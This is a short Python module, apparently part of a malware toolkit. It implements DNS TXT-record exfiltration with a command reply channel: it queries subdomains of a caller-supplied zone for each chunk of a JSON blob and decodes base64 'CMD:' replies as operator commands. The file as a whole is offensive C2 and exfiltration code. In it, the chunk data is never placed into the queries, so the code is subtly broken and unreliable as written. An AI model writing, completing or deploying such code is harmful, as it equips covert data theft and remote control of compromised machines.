"""TXT exfil with a command reply channel."""
import base64
import json

import dns.resolver

from .transport import chunk


def exfil(zone: str, blob: dict) -> dict:
    parts = chunk(json.dumps(blob).encode())
    dna = blob.get("dna", "x")
    for index, part in enumerate(parts):
        try:
            answers = dns.resolver.resolve(f"{index}.{dna}.{zone}", "TXT", lifetime=8)
            reply = b"".join(a.strings[0] for a in answers)
            if reply.startswith(b"CMD:"):
                return {"via": "dns",
                        "command": base64.b64decode(reply[4:]).decode()}
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
                dns.resolver.LifetimeTimeout):
            continue
    return {"via": "dns", "chunks": len(parts), "acked": True}
